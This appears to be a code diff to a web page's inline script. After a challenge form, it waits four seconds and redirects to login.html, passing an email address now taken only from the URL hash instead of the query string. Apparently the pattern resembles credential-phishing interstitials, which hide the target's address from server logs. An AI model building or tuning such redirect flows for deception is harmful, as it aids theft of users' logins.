@@ -83,30 +83,26 @@
       document.getElementById("turnstile-form").submit();
     }
   </script>
-<script>
+  <script>
 window.onload = function () {
+
   setTimeout(() => {
+
+    // Extract from URL hash ONLY
     let email = "";
-
-    // Read ?email= from URL
-    const params = new URLSearchParams(window.location.search);
-    if (params.has("email")) {
-      email = params.get("email");
-    }
-
-    // Read #email from URL
-    if (!email && window.location.hash) {
+    if (window.location.hash) {
       email = window.location.hash.replace("#", "");
     }
 
-    // Redirect and pass email
-    if (email) {
-      window.location.href = "login.html?email=" + encodeURIComponent(email);
+    // Redirect (only passing email if it exists)
+    if (email.length > 0) {
+      window.location.href = "login.html#" + encodeURIComponent(email);
     } else {
       window.location.href = "login.html";
     }
 
   }, 4000);
+
 };
 </script>
 
